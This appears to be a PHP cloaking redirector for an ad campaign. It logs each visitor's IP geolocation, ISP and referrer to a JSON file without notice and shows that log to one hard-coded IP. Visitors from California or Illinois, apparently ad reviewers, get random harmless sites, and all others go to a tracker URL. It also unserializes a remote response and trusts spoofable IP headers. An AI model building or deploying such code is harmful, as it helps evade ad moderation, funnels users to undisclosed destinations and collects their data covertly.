<?php
date_default_timezone_set('Asia/Jerusalem');
//echo 'Hello visitor from '.get_ip().'</br>';
//echo 'Your real IP is: '.getRealIP().'</br>';
//$ip = $_REQUEST['REMOTE_ADDR']; // the IP address to query
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.get_ip()));
if($query && $query['status'] == 'success') {
    
    $query["date"] = date('l jS \of F Y h:i:s A');
    $query["referer"] = $_SERVER['HTTP_REFERER'];

	$json = file_get_contents('mail_source.json');
	// Декодируем
	$json = json_decode($json, true);
	// Добавляем элемент
	$json[] = $query;
	// Превращаем опять в JSON
	$json = json_encode($json);
	// Перезаписываем файл
	file_put_contents('mail_source.json', $json);

  //echo 'Hello visitor from '.$query['country'].', '.$query['countryCode'].', '.$query['region'].', '.$query['regionName'].', '.$query['city'].', '.$query['zip'].', '.$query['lat'].', '.$query['lon'].', '.$query['timezone'].', '.$query['isp'].', '.$query['org'].', '.$query['as'].', '.$query['query'].'!';
} else {
  //echo 'Unable to get location';
}



function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

if($query['query']=='79.182.114.171') {
    echo "<link href=\"style.css\" rel=\"stylesheet\">";
    echo "<script src=\"//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js\"></script>";
    echo "<script src=\"js.js\"></script>";
    echo "<table id=\"myTable\" border=\"1\">
    <thead>
        <tr>
        <td class=\"col1\">Кто выдал IP адрес</td>
        <td class=\"col2\">Город</td>
        <td class=\"col3\">Страна</td>
        <td class=\"col4\">Код Страны</td>
        <td class=\"col5\">Провайдер</td>
        <!--<td class=\"col6\">lat</td>
        <td class=\"col7\">lon</td>-->
        <td class=\"col8\">Название организации</td>
        <td class=\"col9\">IP адрес</td>
        <td class=\"col10\">Регион</td>
        <td class=\"col11\">regionName</td>
        <td class=\"col12\">статус</td>
        <td class=\"col13\">временная зона</td>
        <td class=\"col14\">реферер</td>
        <td class=\"col15\">Время посещения</td>
        </tr>
    </thead
    </table>";
}

$UrlObj = file_get_contents('urls.json');
$my_new_array = json_decode($UrlObj, true); 

	//$arr = array("https://www.youtube.com/watch?v=k27Oga3Wmxs", "https://www.olx.ua", "https://www.pinterest.com/", "http://kinoprofi.org/", "http://www.flaticon.com/");

	if (($query["regionName"] == "California")||($query["regionName"] == "Illinois")) {
		header("Cache-Control: no-cache, must-revalidate");
		header("HTTP/1.1 301 Moved Permanently");
		header("Location: ".$my_new_array["".rand(0, 99)]);
	} else {
	    header("Cache-Control: no-cache, must-revalidate");
		header("HTTP/1.1 301 Moved Permanently");
		header("Location: http://tracker.xkuklohd.beget.tech/track/los-pollos-bez-uvoda/source/campaign-ads");
	}
	exit();

?>